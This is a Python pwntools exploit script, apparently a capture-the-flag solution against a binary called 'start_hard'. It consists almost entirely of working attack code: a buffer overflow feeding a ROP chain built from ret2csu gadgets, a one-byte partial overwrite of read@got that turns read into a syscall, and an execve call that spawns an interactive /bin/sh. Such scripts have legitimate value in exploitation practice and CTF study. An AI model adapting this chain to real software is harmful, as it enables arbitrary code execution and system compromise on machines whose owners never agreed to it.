from pwn import *
libc = ELF("/usr/lib/libc.so.6", checksec=False)
elf = ELF("./start_hard_c8b452f5aab9a474dcfe1351ec077a601fdf8249", checksec=False)
pop_rsi_r15 = p64(0x00000000004005c1)
pop_rdi = p64(0x00000000004005c3)
bss = 0x000000000601038 + 0x100
'''
ret2csu
  4005a0:       4c 89 ea                mov    rdx,r13
  4005a3:       4c 89 f6                mov    rsi,r14
  4005a6:       44 89 ff                mov    edi,r15d
  4005a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005ad:       48 83 c3 01             add    rbx,0x1
  4005b1:       48 39 eb                cmp    rbx,rbp
  4005b4:       75 ea                   jne    4005a0 <__gmon_start__@plt+0x180>
  4005b6:       48 83 c4 08             add    rsp,0x8
  4005ba:       5b                      pop    rbx
  4005bb:       5d                      pop    rbp
  4005bc:       41 5c                   pop    r12
  4005be:       41 5d                   pop    r13
  4005c0:       41 5e                   pop    r14
  4005c2:       41 5f                   pop    r15
  4005c4:       c3                      ret
'''
def ret2csu(call_func, edi, rsi, rdx):
    payload = p64(0x4005ba)
    payload += b''.join([
        p64(0),
        p64(1),
        p64(call_func),
        p64(rdx),
        p64(rsi),
        p64(edi)
    ])
    payload += p64(0x4005a0)
    payload += b''.join([
        p64(0)*7,
    ])
    return payload

payload = b''.join([
    cyclic(16), p64(0),

    # insert "/bin/sh\x00"
    pop_rsi_r15, p64(bss), p64(0),
    p64(elf.plt['read']),

    # set $rdx = 1
    pop_rsi_r15, p64(bss-1), p64(0),
    p64(elf.plt['read']),

    # overwrite one byte read@got to point syscall, $rax=1
    pop_rsi_r15, p64(elf.got['read']), p64(0),
    p64(elf.plt['read']),

    # syscall read(1, bss, 0x3b), $rax=0x3b
    ret2csu(elf.got['read'], 1, bss, 0x3b),

    # syscall execve(bss, NULL, NULL)
    ret2csu(elf.got['read'], bss, 0, 0)

])
p = elf.process()
p.sendline(payload)
p.sendline(b"/bin/sh\x00") # send to bss
p.send(b'\n')   # set $rdx = 1
sleep(1)
p.send(b'\x49') # from read() to syscall
p.interactive()